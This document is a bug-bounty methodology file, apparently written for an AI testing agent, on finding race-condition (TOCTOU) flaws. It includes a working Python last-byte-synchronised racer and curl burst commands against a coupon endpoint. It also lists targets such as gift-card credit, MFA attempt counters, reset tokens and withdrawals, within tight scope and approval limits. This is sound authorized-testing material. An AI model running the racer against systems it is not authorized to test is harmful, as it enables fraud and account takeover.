# Race Conditions / TOCTOU — the authorization decision and the action are not atomic

<!-- workspace rung mapping -->

> **Rung mapping.** This file was written against a five-rung safety ladder. In this workspace those rungs are: **1** read-only · **2** write to an object _you_ own, reverted immediately · **3** bounded scale proof, 5–10 records, never a dump · **4** the same proof relocated to a UAT/OAT host · **5** anything touching a third party's object — **pause and ask d0x directly before executing**, providing the exact request, affected state and rollback plan. This is interactive routing, not a terminal state.

## Contents

- Safety bound — read before firing a single request
- Method A — `curl --parallel` (cheap first probe, imprecise)
- Method B — last-byte synchronisation (HTTP/1.1, the shipped racer)
- Method C — HTTP/2 single-packet (what it is, what this host can actually do)
- Targets that actually pay
- Oracle — what proves a race and what does not
- Negative control
- Converts?
- Evidence checklist
- Handoffs

This file is the pack's single owner of race / TOCTOU. Any other skill that needs the mechanism (an MFA attempt counter, a metered generation, a revoked token still in flight) links here instead of restating it.

Use when a _check_ and its _effect_ are separated by a window: the server reads a coupon/credit/seat/attempt/balance, decides, then writes — and nothing holds a lock across the two. Safe ladder: the **Rung mapping** above.

## Safety bound — read before firing a single request

- **2–3 concurrent, never more.** The shipped racer refuses `-n > 8`. Extra winners add nothing: two winners where one was allowed already proves non-atomicity.
- **Own account, own object, own org.** Never race another user's record, and never race a _shared_ counter (real product inventory, a public seat pool) — extra winners there damage the merchant, not you.
- **Revert immediately**: cancel the duplicate order, remove the extra seat/invite, delete the second record. Record the revert in the finding.
- **Financial / payment actions are rung 5 — do not fire until d0x approves**, even on your own account. Withdrawal, transfer, refund, purchase, gift-card or store-credit redemption move real money the moment the second winner lands; that is not something to discover mid-run.
- One burst, then read the state. If the first burst does not win, change the _angle_ (a different endpoint in the same flow, a different state transition), not the request count.

## Method A — `curl --parallel` (cheap first probe, imprecise)

One process, N handles, all fired as soon as they connect. Use it to decide whether the racer is worth building — not as the proof.

```bash
# 3 identical redemptions of a single-use coupon on YOUR OWN cart
U=https://$HOST/api/cart/coupon
curl -s --parallel --parallel-immediate --parallel-max 3 \
  -X POST "$U" -H "$AUTH" -H 'Content-Type: application/json' -d '{"code":"SAVE50"}' -w '%{http_code} %{time_pretransfer}\n' -o /dev/null \
  --next -X POST "$U" -H "$AUTH" -H 'Content-Type: application/json' -d '{"code":"SAVE50"}' -w '%{http_code} %{time_pretransfer}\n' -o /dev/null \
  --next -X POST "$U" -H "$AUTH" -H 'Content-Type: application/json' -d '{"code":"SAVE50"}' -w '%{http_code} %{time_pretransfer}\n' -o /dev/null
```

**`--next` is mandatory here, and getting it wrong produces a silent false negative.** Without it curl treats the whole command line as ONE transfer definition repeated across three URLs, and it **concatenates the repeated `-d` values with `&`**. Measured on this host against a local echo server, the `--next`-less form delivered `{"code":"SAVE50"}&{"code":"SAVE50"}&{"code":"SAVE50"}` to all three requests — a body any real JSON API answers with 400. The operator then reads three failures as "the window is not raceable" and rotates away from a live bug. `-w` and `-o` are per-transfer for the same reason: repeat both on every `--next` block.

Honest limitation, measured on this host against a local TLS lab: the three handles wrote their requests at `time_pretransfer` 2.70 ms / 4.07 ms / 5.40 ms — a **2.7 ms spread over loopback**, because each handle completes its own TLS handshake before it sends anything. On a real target that spread is the handshake RTT, tens of milliseconds, which is wider than most check→act windows. `--parallel` wins only against sloppy windows; a negative result from it means nothing.

## Method B — last-byte synchronisation (HTTP/1.1, the shipped racer)

Open N sockets, send every byte of the request **except the last**, let the heads land, then release the final byte on all N sockets from a single thread in a tight loop. The server does the expensive work (TLS, parse, route, session lookup) before the race even starts, so the requests reach the handler within microseconds of each other. Releasing from one thread — not from N threads behind a barrier — avoids Python's GIL hand-off, which is worth several milliseconds on its own.

```bash
mkdir -p targets/<program>/gadgets && cat > targets/<program>/gadgets/lastbyte.py <<'PY'
#!/usr/bin/env python3
"""Last-byte-synchronised racer -- HTTP/1.1, python3 stdlib only.

usage: python3 lastbyte.py <req.txt> [-n 3] [--tls] [--port P] [--host H]

Opens N sockets, sends every byte of the request except the last, waits for the
heads to land, then releases the final byte on all N sockets from ONE thread in
a tight loop (no GIL hand-off jitter). Bound: default 3, hard cap 8.
"""
import argparse, socket, ssl, sys, time

ap = argparse.ArgumentParser()
ap.add_argument("req")
ap.add_argument("-n", type=int, default=3)
ap.add_argument("--tls", action="store_true")
ap.add_argument("--port", type=int, default=0)
ap.add_argument("--host", default="")
ap.add_argument("--prime-ms", type=int, default=150)
a = ap.parse_args()
if a.n > 8:
    sys.exit("refuse: bound the race to <=8 (safe-ladder). 2-3 proves it.")

raw = open(a.req, "rb").read().replace(b"\r\n", b"\n").replace(b"\n", b"\r\n")
head, _, body = raw.partition(b"\r\n\r\n")
lines = head.split(b"\r\n")
hdrs = [l for l in lines[1:] if l]
hosthdr = a.host or next((l.split(b":", 1)[1].strip().decode()
                          for l in hdrs if l.lower().startswith(b"host:")), "")
host, _, hport = hosthdr.partition(":")
port = a.port or int(hport or (443 if a.tls else 80))
# one socket per racer: drop keep-alive, recompute Content-Length
hdrs = [l for l in hdrs if not l.lower().startswith((b"connection:", b"content-length:"))]
if body:
    hdrs.append(b"Content-Length: %d" % len(body))
hdrs.append(b"Connection: close")
req = lines[0] + b"\r\n" + b"\r\n".join(hdrs) + b"\r\n\r\n" + body
first, last = req[:-1], req[-1:]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

socks = []
for _ in range(a.n):                       # phase 1: connect + send all but 1 byte
    s = socket.create_connection((host, port), timeout=15)
    if a.tls:
        s = ctx.wrap_socket(s, server_hostname=host)
    s.sendall(first)
    socks.append(s)
time.sleep(a.prime_ms / 1000)              # phase 2: let every head land
t0 = time.perf_counter()
for s in socks:                            # phase 3: release, single thread, tight loop
    s.sendall(last)
rel = (time.perf_counter() - t0) * 1000
for i, s in enumerate(socks):              # phase 4: drain
    buf = b""
    try:
        while len(buf) < 4096:
            c = s.recv(4096)
            if not c:
                break
            buf += c
    except OSError:
        pass
    s.close()
    status = buf.split(b"\r\n", 1)[0].decode("utf-8", "replace")
    tail = buf.rpartition(b"\r\n\r\n")[2][:120].decode("utf-8", "replace")
    print(f"[{i}] {status}  {tail}")
print(f"# {a.n} final bytes released within {rel:.3f} ms", file=sys.stderr)
PY
```

Feed it a raw request saved from the proxy (`targets/<program>/wordlists/req.txt` convention — same file shape `ffuf -request` uses). `Content-Length` is recomputed from the body, so an editor's trailing newline cannot silently corrupt the request.

```bash
cat > targets/<program>/wordlists/race-req.txt <<'REQ'
POST /api/cart/coupon HTTP/1.1
Host: app.target.com
Authorization: Bearer <own-token>
Content-Type: application/json

{"code":"SAVE50"}
REQ

curl -s -X GET "https://$HOST/api/cart" -H "$AUTH" | jq '{discount,total}'   # state BEFORE
python3 targets/<program>/gadgets/lastbyte.py targets/<program>/wordlists/race-req.txt -n 3 --tls
curl -s -X GET "https://$HOST/api/cart" -H "$AUTH" | jq '{discount,total}'   # state AFTER
```

Executed against a local TLS lab whose single-use coupon has a 20 ms check→act gap, 3 racers:

```
# 3 final bytes released within 0.139 ms
[0] HTTP/1.1 200 OK  {"redeemed": true, "winners": 1}
[1] HTTP/1.1 200 OK  {"redeemed": true, "winners": 2}
[2] HTTP/1.1 200 OK  {"redeemed": true, "winners": 3}
```

Three winners on a single-use coupon; the final bytes left the client **0.14 ms** apart versus `--parallel`'s 2.7 ms spread. Same lab, same three requests sent sequentially: `200 409 409` — the check works fine when nothing is concurrent.

## Method C — HTTP/2 single-packet (what it is, what this host can actually do)

The h2 refinement: multiplex N requests as N streams on one connection, withhold the last frame of each, then write all N final frames into a **single TCP packet**. Every request is then processed within the same kernel read, removing network jitter entirely — the reason h2 races land windows that HTTP/1.1 cannot.

Reality on this host: `curl` speaks h2 (`--http2`, nghttp2 1.59) but cannot hold a frame back, and `h2load`/`nghttp` are absent. The python `h2` module (4.3.0) is importable, but no tested single-packet implementation ships in this pack — do not paste an untested one into a live target. **The practical route is: force the same endpoint down HTTP/1.1 and use the racer above.**

```bash
curl -sI --http2   "https://$HOST/api/cart/coupon" -o /dev/null -w 'h2:  %{http_version}\n'
curl -sI --http1.1 "https://$HOST/api/cart/coupon" -o /dev/null -w 'h1:  %{http_version}\n'
```

Nearly every edge still accepts `1.1` on the same host. If it truly does not, and the h1 racer cannot win the window, say so in `notes/` and rotate the angle — a race you cannot land is not a finding, and the h2 tooling gap is a tooling note, not a silent "nothing found" (the **Stack** section of the root `AGENTS.md`).

## Targets that actually pay

| Surface | Race this | State that proves it |
| --- | --- | --- |
| Coupon / promo code | redeem the single-use code N× | discount applied N×, code still `used:false` or used-count = 1 |
| Gift card / store credit | redeem the same card on N carts | balance debited once, credit granted N× |
| Invite / seat / member add | add the (limit+1)-th member N× | member count exceeds the plan's documented seat limit |
| Follow / vote / rate / react | the "once per user" action | counter = N for one actor |
| MFA / OTP attempt counter | submit N codes in one burst | attempts-remaining decremented once — brute-force window reopened |
| Password-reset token | consume the single-use token N× | token still valid after the first consumption |
| Withdrawal / transfer / refund | **rung 5, ask d0x directly before executing** | balance debited once, funds credited N× |
| Metered / entitled action | the credit-consuming generation | output produced N×, credit meter moved once |
| Cancel-vs-use, revoke-vs-use | the action and its revocation together | action completes after the revocation timestamp |

The MFA counter and reset-token cases are raced with the mechanism here but their flow semantics (lockout policy, token lifetime) belong to the `auth-flow-bypass` skill. The metered/entitled case hands the cost framing to `resource-abuse`.

## Oracle — what proves a race and what does not

**Proves it:**

- N HTTP successes where the 2nd..Nth should have returned `409` / `403` / `already redeemed` / `limit reached`, **and**
- a follow-up canonical read where the state is off by _exactly_ the number of extra winners (balance, seat count, discount total, attempts-remaining, row count), **and**
- the same requests sent sequentially produce `1× success + (N-1) × denial`.

All three, in that order. The status codes alone are a lead; the state read is the finding.

**Does not prove it:**

- one success and two denials — the check held, that is the app working;
- a `500` / `503` / `deadlock detected` / lock-timeout from the extra racers — the server serialised and failed loudly; no invariant was broken. (A `500` _plus_ a duplicated row is a different story: read the state before deciding.)
- two `200`s with an idempotent body and no state change (idempotency key honoured);
- a counter that self-heals on the next read (eventual reconciliation);
- "the endpoint is slow", "responses arrived out of order".

## Negative control

Always capture it, in the same session, immediately after the burst:

```bash
for i in 1 2 3; do
  curl -s -o /dev/null -w '%{http_code} ' -X POST "https://$HOST/api/cart/coupon" \
    -H "$AUTH" -H 'Content-Type: application/json' -d '{"code":"SAVE50"}'
done; echo
```

`200 409 409` sequential versus `200 200 200` concurrent is the whole report in two lines. Without it a triager cannot tell a race from a coupon that was never single-use.

## Converts?

- **Medium** is the honest default: coupon/promo reuse, seat or invite overrun, follow/vote/rating inflation, duplicate submission. Real, reproducible, bounded money or bounded abuse.
- **High** when the extra winners convert directly into value or into another boundary: store credit / gift card multiplied, a paid plan's seat limit defeated, a metered entitlement bypassed (pair with `resource-abuse` and anchor on the vendor's published price), an MFA attempt counter that never decrements (brute-force reopened).
- **Critical** is rare and needs a chain, not a race alone: double-spend of real funds on a withdrawal/transfer (rung 5 — ask d0x directly before executing instead), or a race that lands account takeover.
- **Low / closed as informative** — and this is where most race reports die: a single success ("I sent 20 and one worked"); a race on a rate-limit counter with no privileged effect; follow/vote inflation on a product where the counter is cosmetic (the `validator` agent files exactly this as Low); no before/after state read; or an unbounded flood, which also gets the hunter throttled and the report closed as testing abuse.

The reliable upgrade path is not more concurrency — it is finding the _state_ the extra winner corrupts and reading it back.

## Evidence checklist

- the raw request file used (identity, endpoint, body);
- state read **before** the burst;
- the racer's output — N status lines and the release-window figure;
- state read **after** the burst, showing the off-by-N invariant;
- the sequential negative control;
- the revert (what was cancelled/removed, and the confirming read);
- for a financial action: d0x's explicit go-ahead, quoted, before the burst.

## Handoffs

- `resource-abuse` — the extra winners are billed compute/quota rather than a broken invariant.
- the `auth-flow-bypass` skill — MFA attempt counters, OTP lockout, reset-token single-use semantics (mechanism stays here).
- `lifecycle-persistence.md` — the revoke-vs-use window: the race between removing access and using it.
- `validation` — mandatory before reporting any race above Medium.
